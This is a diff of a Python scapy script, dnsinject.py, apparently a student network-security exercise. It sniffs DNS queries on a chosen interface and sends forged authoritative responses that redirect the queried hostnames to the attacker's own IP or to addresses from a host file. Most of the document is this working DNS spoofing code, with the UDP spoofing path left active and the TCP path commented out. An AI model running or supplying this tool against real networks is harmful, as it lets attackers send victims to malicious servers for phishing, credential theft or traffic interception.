@@ -2,6 +2,8 @@ import argparse
 import netifaces as ni
 from scapy.all import *
 
+# note to self: run this script using "sudo $(which python) dnsinject.py" after activating the venv
+
 def get_ip(ifname):
     # for reference: ni.ifaddresses('eth0') outputs ----
     # ---> {2: [{'broadcast': '172.17.255.255', 'addr': '172.17.0.2', 'mask': '255.255.0.0'}], 17: [{'addr': '02:42:ac:11:00:02', 'broadcast': 'ff:ff:ff:ff:ff:ff'}]}
@@ -11,9 +13,10 @@ def get_ip(ifname):
 
 def dnsinject(pkt):
     if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0: # check for IP && DNSQR headers + make sure it is a DNS query
-        host = pkt[DNSQR].qname # hostname of DNSQR packet
-        print("host: ", host)
+        # host = pkt[DNSQR].qname # hostname of DNSQR packet
+        print("host: ", pkt[DNSQR].qname)
         if d["hostfile"] != None: # the file of hostnames was given
+            host = pkt[DNSQR].qname # hostname of DNSQR packet
             if not host.decode().rstrip(".") in ip_mapping.keys(): # not a host in file
                 return
             redir_ip = ip_mapping[host.decode().rstrip(".")] # get the ip of the host matching the given file
@@ -21,6 +24,7 @@ def dnsinject(pkt):
             redir_ip = get_ip(str(d["interface"]))
         
         # SPOOFING TIME i.e. respond to dns query 
+        # note: using linux and therefore will be udp most of the time anyway (no need for tcp)
         if pkt.haslayer(UDP):
             ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # swap the ip src and dst for the packet
             udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) # swap the udp src and dst ports for the packet
@@ -28,13 +32,13 @@ def dnsinject(pkt):
             dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1, qdcount=1, nscount=0, arcount=0, an=dnsrr)
             spoof = ip/udp/dns
             send(spoof)
-        elif pkt.haslayer(TCP): # same as ^ but for TCP
-            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-            tcp = TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)
-            dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip)
-            dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1, qdcount=1, nscount=0, arcount=0, an=dnsrr)
-            spoof = ip/tcp/dns
-            send(spoof)
+        # elif pkt.haslayer(TCP): # same as ^ but for TCP
+        #     ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+        #     tcp = TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)
+        #     dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip)
+        #     dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1, qdcount=1, nscount=0, arcount=0, an=dnsrr)
+        #     spoof = ip/tcp/dns
+        #     send(spoof)
         else:
             return
     # send(spoof)
@@ -61,7 +65,7 @@ if __name__ == "__main__":
         print(ip_mapping) # FOR TESTING
 
     # Filter UDP port 53 and DNS queries only 
-    packets = sniff(filter="udp dst port 53 and udp[10] & 0x80 = 0", iface=d["interface"], prn=dnsinject, store=False)
+    sniff(filter="udp dst port 53 and udp[10] & 0x80 = 0", iface=d["interface"], prn=dnsinject, store=False)
 
     # print(packets) # FOR TESTING
     # print(d)
